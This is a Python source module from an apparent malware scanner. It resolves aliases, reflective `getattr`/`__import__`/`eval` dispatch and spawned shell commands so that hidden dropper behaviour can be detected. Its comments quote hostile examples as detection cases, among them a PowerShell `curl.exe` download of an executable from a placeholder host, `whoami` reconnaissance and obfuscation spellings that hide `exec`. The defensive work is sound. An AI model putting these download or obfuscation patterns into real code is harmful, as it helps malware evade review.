"""The Python analyser's state and its core: the name tables a tree binds, dotted names resolved
through them, callees resolved through aliases, and hits recorded. Its flows build on this.
"""

from __future__ import annotations

import ast
from typing import ClassVar

from cordon_scanner.analysis.python.flows.http_clients import HTTP_CLIENTS
from cordon_scanner.analysis.python.py_identity import IDENTITY_COMMANDS, IdentityVariables
from cordon_scanner.analysis.python.pyfacts import (
    PRIMITIVES,
    AstHit,
    PythonFacts,
)
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.analysis.python.vocabulary import (
    BUILTIN_MODULES,
    REFLECTIVE,
)
from cordon_scanner.foundation.capabilities import Capability


class AnalyzerCore:
    """The Python analyser's state and the resolution its flows share."""

    def __init__(self) -> None:
        # Alias -> dotted primitive. `import base64 as b` gives `b -> base64`;
        # `from os import system as s` gives `s -> os.system`.
        self._aliases: dict[str, str] = {}
        # Functions another file of the package defines that run their own parameters as a command,
        # by position (`ImportedClients.runners_of`): a call to one with a received value is a run.
        self._imported_runners: dict[str, set[int]] = {}
        #: This file's functions and the parameter positions another file of the package passes a
        #: carried value (`CarriedCalls`): a decode of those is a carried payload's.
        self._carried_calls: dict[str, set[int]] = {}
        # Local name -> dotted primitive, from `f = os.system`.
        self._bindings: dict[str, str] = {}
        # `self.x` / `cls.x` -> what it is bound to in this file: `self._session = requests.Session()`
        # makes `self._session.post` a request (`HTTP_CLIENTS`).
        self._attribute_bindings: dict[str, str] = {}
        # Inner call -> the call that invokes its result. `getattr(os, "system")`
        # resolves to a primitive, but the command it is handed belongs to the
        # enclosing `(...)`, so the two nodes have to be related to read it.
        self._invoked: dict[int, ast.Call] = {}
        # Names whose every possible value is written in the file. See `_enumerated`.
        self._enumerated: set[str] = set()
        # `__import__` calls that only ask whether a module is installed, by span. See `_probes_of`.
        self._probes: set[tuple[int, int, int, int]] = set()
        # Whether the module takes a module back from `sys.modules` by a computed key, which voids
        # every probe (`_names_complete`).
        self._probes_vetoed = False
        # Per name, how many assignments bind it, and how many of those to a plain string literal
        # (`_names_complete` makes `_plain_literals` of them).
        self._binding_counts: tuple[dict[str, int], dict[str, int]] = ({}, {})
        self._follow_literals = True
        # Name -> the string literal it is bound to, for names bound exactly once.
        self._strings: dict[str, str | None] = {}
        # The module being analysed, for values its top-level statements compute from literals
        # (`LiteralProgram`).
        self._module_tree: ast.AST | None = None
        # Name -> the f-string or concatenation it is bound to, for names bound exactly once.
        self._sketches: dict[str, ast.AST] = {}
        # Names bound only ever to a plain string literal. See `_assembled_name`.
        self._plain_literals: set[str] = set()
        # Names bound to a path built from `__file__`. See `_loads_a_bundled_file`.
        self._bundled_paths: set[str] = set()
        # Names bound to the text of a local file. See `_read_from_local_file`.
        self._local_reads: set[str] = set()
        # Lines whose `exec`/`eval` runs the package's own file. See `own_file_exec_lines`.
        self._excused_lines: set[int] = set()
        self._sketched: set[str] = set()
        self._hits: list[AstHit] = []

    #: What a failed import raises.
    _MISSING: ClassVar[frozenset[str]] = frozenset({"ImportError", "ModuleNotFoundError"})

    @classmethod
    def _probes_of(cls, tree: ast.AST) -> tuple[set[tuple[int, int, int, int]], bool]:
        """`__import__(name)` calls that only ask whether a module is installed: a statement of its
        own, its result dropped, in a `try` whose handler catches the failed import. Nothing is
        reached through such a call, so the name it is handed is not a dispatch -- the dependency
        checks real skills run (`check_module(name)`, review 98, anything-to-notebooklm). A name
        handed whole (a variable), never a call building it; and none at all in a file that then
        takes a module back from `sys.modules` by a computed key, which is how a probe's import
        would be reached after all. Each probe by its span, never its node, so the set holds across
        trees; and whether this tree takes a module back by a computed key (the veto), which
        `_names_complete` applies to the whole module's probes."""
        for node in PythonSyntax.of(tree, ast.Subscript):
            target = node.value
            if (
                isinstance(target, ast.Attribute)
                and target.attr == "modules"
                and isinstance(target.value, ast.Name)
                and target.value.id == "sys"
                and not isinstance(node.slice, ast.Constant)
            ):
                return set(), True
        found: set[tuple[int, int, int, int]] = set()
        for node in PythonSyntax.of(tree, ast.Try):
            caught: set[str] = set()
            for handler in node.handlers:
                kinds = handler.type.elts if isinstance(handler.type, ast.Tuple) else [handler.type]
                caught |= {k.id for k in kinds if isinstance(k, ast.Name)}
            if not caught & cls._MISSING:
                continue
            for statement in node.body:
                call = statement.value if isinstance(statement, ast.Expr) else None
                if (
                    isinstance(call, ast.Call)
                    and isinstance(call.func, ast.Name)
                    and call.func.id == "__import__"
                    and len(call.args) == 1
                    and not call.keywords
                    and isinstance(call.args[0], ast.Name)
                ):
                    found.add(PythonSyntax.span(call))
        return found, False

    def _names_complete(self) -> None:
        """What only the whole module decides, once every statement is collected."""
        counts, literal_counts = self._binding_counts
        # Every binding of the name is a plain literal; a name reassigned from anything else
        # could hold that instead.
        self._plain_literals = {
            bound for bound, count in literal_counts.items() if counts.get(bound) == count
        }
        if self._probes_vetoed:
            # A computed `sys.modules[...]` anywhere, a later statement included (`_probes_of`).
            self._probes = set()
        # The tables are complete: from here a name resolves the same way every time it is asked.
        self._dotted_cache: dict[int, str | None] = {}

    def _resolve_callee(self, node: ast.Call) -> tuple[str, ast.Call] | None:
        """This call's dotted name, and the call whose arguments belong to it.

        The two differ for reflective dispatch: in `getattr(os, "system")(cmd)`
        the name comes from the inner call and `cmd` from the outer one.
        """
        dotted = self._dotted(node.func)
        base = dotted.split(".")[-1] if dotted else None

        if base in REFLECTIVE:
            namespace = self._dotted(node.args[0]) if node.args else None
            attribute = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None
            if namespace and attribute is not None:
                return f"{namespace}.{attribute}", self._invoked.get(id(node), node)
            return None

        return (dotted, node) if dotted else None

    def _dotted(self, node: ast.AST) -> str | None:
        """The dotted name an expression refers to, unwinding aliases.

        `b.b64decode` where `b` is `base64` becomes `base64.b64decode`; `go`
        where `go` is `subprocess.run` becomes `subprocess.run`.
        """
        # Kept per node once the alias tables are complete (`_collect_names` creates the cache as
        # its last step): 3.5 million resolutions scanning this package, most of them repeats.
        cache: dict[int, str | None] | None = self.__dict__.get("_dotted_cache")
        if cache is not None:
            key = id(node)
            if key in cache:
                return cache[key]
            found = self._dotted_uncached(node)
            cache[key] = found
            return found
        return self._dotted_uncached(node)

    def _dotted_uncached(self, node: ast.AST) -> str | None:
        # Down the chain of attributes and calls first, then back up: by a list, not by recursion,
        # because a builder chain is as many links long as its author wrote (PySegmentKit 0.2.1's
        # thousands of `.where(...)` stopped the detector at the recursion limit). An attacker's
        # deep chain resolves fully too; a depth cap would let one hide a name behind it.
        # Every link is kept in the per-node cache as it resolves, and a link already there ends the
        # walk down: the capability walk asks for each call of a chain, so without it a chain of n
        # links would cost n * n steps.
        cache: dict[int, str | None] | None = self.__dict__.get("_dotted_cache")
        links: list[ast.Attribute | ast.Call] = []
        name: str | None = None
        while isinstance(node, (ast.Attribute, ast.Call)):
            if cache is not None and links and id(node) in cache:
                name = cache[id(node)]
                break
            links.append(node)
            node = node.value if isinstance(node, ast.Attribute) else node.func
        else:
            if isinstance(node, ast.Name):
                name = self._aliases.get(node.id) or self._bindings.get(node.id) or node.id
        for link in reversed(links):
            if isinstance(link, ast.Attribute):
                if name in BUILTIN_MODULES:
                    # `builtins.exec` is `exec`: the module is how the name is reached, not part of it.
                    name = link.attr
                else:
                    name = f"{name}.{link.attr}" if name else None
                    # `self._session`, bound in this file to `requests.Session()`, is that client.
                    name = self._attribute_bindings.get(name, name) if name else None
            else:
                name = self._called_name(name, link)
            if cache is not None:
                cache[id(link)] = name
        return name

    def _called_name(self, callee: str | None, call: ast.Call) -> str | None:
        """What a call evaluates to by name. `__import__("base64")` and
        `importlib.import_module("base64")` evaluate to the module, so `__import__("base64").b64decode`
        is `base64.b64decode` -- the spelling droppers use to keep `import base64` and `exec(` off the
        same page; `eval` of a written name is that name. Any other call names nothing."""
        if callee in HTTP_CLIENTS:
            # `httpx.Client()` evaluates to a client, so `httpx.Client().post` is a request the way
            # `requests.post` is (`HTTP_CLIENTS`).
            return callee
        if not call.args:
            return None
        if callee in ("__import__", "importlib.import_module"):
            return PythonFacts.constant(call.args[0]) or None
        if callee == "eval":
            return self._evaluated_name(call.args[0])
        return None

    def _evaluated_name(self, node: ast.AST) -> str | None:
        """What `eval` of this argument names, when the argument is written in the file.

        `eval("exec")` is the builtin `exec`, and `eval(compile("__import__('base64')", "", "eval"))`
        is the module `base64`: an obfuscator's way of reaching both without the name appearing in
        the code. Only an expression that is itself a name, an attribute or an import is followed;
        anything that computes a value is not a name and is left to the dynamic-dispatch check.
        """
        if isinstance(node, ast.Call) and self._dotted(node.func) == "compile" and node.args:
            node = node.args[0]
        source = PythonFacts.constant(node)
        if source is None or len(source) > 200:
            return None
        try:
            expression = PythonSyntax.parse(source.strip(), mode="eval").body
        except (SyntaxError, ValueError):
            # S2: covered by SOURCE.UNPARSED at every running file (install closure, import entries, command modules); proven by test_not_python3.py TestPackageSourceThatDoesNotParse
            return None
        if isinstance(expression, ast.Name | ast.Attribute | ast.Call):
            return self._dotted(expression)
        return None

    def _command(self, node: ast.Call) -> str | None:
        """The command a spawn primitive is being handed.

        Both call shapes are accepted. `os.system("...")` carries the command
        as one string; `subprocess.run(["sh", "-c", "..."])` splits it across a
        sequence, and the parts are rejoined because it is the whole line that
        has to be matched against, not any single argument of it.

        Folded through variables and f-strings, with what cannot be known kept as `{name}`:
        `download = f'curl.exe -L https://h/x.exe -o "{out}"'` handed on as `["powershell",
        "-Command", download]` is still a `curl` the shell rules can read.
        """
        if not node.args:
            return None
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [self._sketch(element) for element in first.elts]
            if all(part is None for part in parts):
                return None
            return " ".join(part for part in parts if part is not None)
        return self._sketch(first)

    def _sketch(self, node: ast.AST, depth: int = 0) -> str | None:
        """A string expression with its unknown parts written `{name}`, or None if it has no
        literal text at all."""
        if depth > 4:
            return None
        literal = PythonFacts.constant(node)
        if literal is not None:
            return literal
        if isinstance(node, ast.JoinedStr):
            pieces = []
            for value in node.values:
                part = PythonFacts.constant(value)
                if part is None and isinstance(value, ast.FormattedValue):
                    inner = value.value
                    part = (
                        self._strings.get(inner.id)
                        or (self._sketch(inner, depth + 1) if inner.id in self._sketches else None)
                        or f"{{{inner.id}}}"
                        if isinstance(inner, ast.Name)
                        else "{?}"
                    )
                pieces.append(part or "")
            return "".join(pieces)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left, right = self._sketch(node.left, depth + 1), self._sketch(node.right, depth + 1)
            if left is None and right is None:
                return None
            return (left or "{?}") + (right or "{?}")
        if isinstance(node, ast.Name):
            # A name bound to one literal is that literal, as the f-string branch above reads it:
            # `cmd = "..."; subprocess.run(cmd, shell=True)` hides nothing from the shell rules
            # (07-NARROWING-GATES §2). Assigned two different literals, `_strings` holds None.
            literal = self._strings.get(node.id)
            if literal is not None:
                return literal
            bound = self._sketches.get(node.id)
            if bound is not None:
                return self._sketch(bound, depth + 1)
        if (
            isinstance(node, ast.Call)
            and self._dotted(node.func) in ("os.getenv", "os.environ.get", "getenv")
            and node.args
        ):
            # A location named by an environment variable -- `os.getenv("TEMP") + "\\x.exe"`
            # -- is the same file wherever the expression is written twice.
            name = PythonFacts.constant(node.args[0])
            if name is not None:
                return f"{{env:{name}}}"
        return None

    def _is_recon_call(self, node: ast.AST) -> bool:
        """Who or where this machine is: `socket.gethostname()`, a process spawned to say so
        (`getoutput("whoami")`), or the variable naming it (`os.getenv("COMPUTERNAME")`)."""
        if not isinstance(node, ast.Call):
            return isinstance(node, ast.Subscript) and IdentityVariables.read(
                node, self._dotted(node.value)
            )
        resolved = self._resolve_callee(node)
        if resolved is None:
            return False
        if IdentityVariables.read(node, resolved[0]):
            return True
        capability = PRIMITIVES.get(resolved[0])
        if capability is Capability.RECONNAISSANCE:
            return True
        if capability is not Capability.SPAWN:
            return False
        command = self._command(node) or ""
        first = command.strip().split(" ", 1)[0].rsplit("/", 1)[-1].lower()
        return first.removesuffix(".exe") in IDENTITY_COMMANDS

    def _record(
        self,
        capability: Capability,
        node: ast.AST,
        detail: str,
        command: str | None = None,
        *,
        fixed: bool = False,
    ) -> None:
        keep = command if capability is Capability.SPAWN else None
        self._hits.append(
            AstHit(
                capability=capability,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
                command=keep,
                fixed_command=fixed and capability is Capability.SPAWN,
            )
        )


__all__ = ["AnalyzerCore"]
